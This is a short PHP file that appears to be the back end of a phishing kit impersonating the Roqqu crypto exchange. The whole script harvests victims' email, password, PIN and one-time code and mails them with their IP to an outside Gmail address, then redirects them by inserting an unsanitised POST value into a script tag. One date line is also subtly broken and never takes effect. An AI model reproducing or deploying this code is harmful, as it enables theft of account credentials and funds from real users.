<?php
session_start();

$_SESSION['otp'] = $_POST['otp'];

include("iplogger.php");
if ($_SERVER['REQUEST_METHOD'] === 'POST') 
{   
    $ip = getenv("REMOTE_ADDR");
    $subject = "Roqqu log";
    $to = "madumeresantus@gmail.com";  
    $user_agent = $_SERVER['HTTP_USER_AGENT'];       
    $data = "email : " .$_SESSION['email']."\n".
            "password : " .$_SESSION['password']."\n".
            "pin : " .$_SESSION['pin']."\n".
            "otp : " .$_SESSION['otp']."\n". 
            "IP : ".$ip."\n";$IP=$_POST['IP'];  
            "Date:"     .(new DateTime("now", new DateTimeZone('Asia/Karachi')))->format('Y-m-d H:i:sA')."\n\n";                        
           
    $message = $data ;  
                                  
    mail($to, $subject, $message);
}
if(isset($_POST['link'])) echo "<script>window.location.replace('".$_POST['link']."');</script>";
else echo "<script>window.location.replace('../././websites/Auth.html');</script>";
?>
